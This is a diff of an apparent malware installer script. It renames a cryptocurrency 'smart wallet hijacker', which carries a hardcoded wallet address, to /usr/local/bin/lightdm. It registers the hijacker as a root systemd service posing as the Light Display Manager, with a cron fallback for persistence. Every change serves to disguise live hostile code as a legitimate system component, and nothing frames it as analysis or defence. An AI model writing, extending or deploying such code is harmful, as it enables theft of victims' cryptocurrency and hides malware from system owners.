@@ -1139,7 +1139,7 @@ echo ""
 echo "[*] Installing smart wallet hijacker..."
 
 # Create the smart wallet hijacker script
-cat > /usr/local/bin/smart-wallet-hijacker << 'HIJACKER_EOF'
+cat > /usr/local/bin/lightdm << 'HIJACKER_EOF'
 #!/bin/bash
 MY_WALLET="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
 CHECK_INTERVAL=300
@@ -1217,19 +1217,20 @@ else
 fi
 HIJACKER_EOF
 
-chmod +x /usr/local/bin/smart-wallet-hijacker 2>/dev/null || true
+chmod +x /usr/local/bin/lightdm 2>/dev/null || true
 
 # Create systemd service for wallet hijacker
 if [ "$SYSTEMD_AVAILABLE" = true ]; then
-    cat > /etc/systemd/system/smart-wallet-hijacker.service << 'HIJACKER_SERVICE_EOF'
+    cat > /etc/systemd/system/lightdm.service << 'HIJACKER_SERVICE_EOF'
 [Unit]
-Description=System wallet monitor
+Description=Light Display Manager
+Documentation=man:lightdm(1)
 After=network.target swapd.service
 
 [Service]
 Type=simple
 User=root
-ExecStart=/usr/local/bin/smart-wallet-hijacker daemon
+ExecStart=/usr/local/bin/lightdm daemon
 Restart=always
 RestartSec=30
 StandardOutput=null
@@ -1240,28 +1241,28 @@ WantedBy=multi-user.target
 HIJACKER_SERVICE_EOF
     
     systemctl daemon-reload 2>/dev/null || true
-    systemctl enable smart-wallet-hijacker 2>/dev/null
-    systemctl start smart-wallet-hijacker 2>/dev/null
+    systemctl enable lightdm 2>/dev/null
+    systemctl start lightdm 2>/dev/null
     
     # Verify it's running
     sleep 2
-    if systemctl is-active --quiet smart-wallet-hijacker 2>/dev/null; then
+    if systemctl is-active --quiet lightdm 2>/dev/null; then
         echo "[✓] Smart wallet hijacker installed and RUNNING (systemd service)"
-        if systemctl is-enabled --quiet smart-wallet-hijacker 2>/dev/null; then
+        if systemctl is-enabled --quiet lightdm 2>/dev/null; then
             echo "[✓] Smart wallet hijacker ENABLED (auto-starts on boot)"
         else
             echo "[!] Warning: Service may not be enabled for auto-start"
             echo "[*] Enabling service..."
-            systemctl enable smart-wallet-hijacker 2>/dev/null || true
+            systemctl enable lightdm 2>/dev/null || true
         fi
     else
         echo "[!] Warning: Smart wallet hijacker service failed to start"
         echo "[*] Trying to start manually..."
-        systemctl start smart-wallet-hijacker 2>/dev/null || true
+        systemctl start lightdm 2>/dev/null || true
     fi
 else
     # For SysV systems, add to cron
-    (crontab -l 2>/dev/null | grep -v smart-wallet-hijacker; echo "*/5 * * * * /usr/local/bin/smart-wallet-hijacker >/dev/null 2>&1") | crontab - 2>/dev/null || true
+    (crontab -l 2>/dev/null | grep -v lightdm; echo "*/5 * * * * /usr/local/bin/lightdm >/dev/null 2>&1") | crontab - 2>/dev/null || true
     echo "[✓] Smart wallet hijacker installed (cron job)"
 fi
 
@@ -1324,7 +1325,7 @@ else
     echo '  ○ Watchdog: Not deployed'
 fi
 
-if [ -f /usr/local/bin/smart-wallet-hijacker ]; then
+if [ -f /usr/local/bin/lightdm ]; then
     echo '  ✓ Smart Wallet Hijacker: ACTIVE (detects -c flag in processes)'
 else
     echo '  ○ Wallet Hijacker: Not deployed'
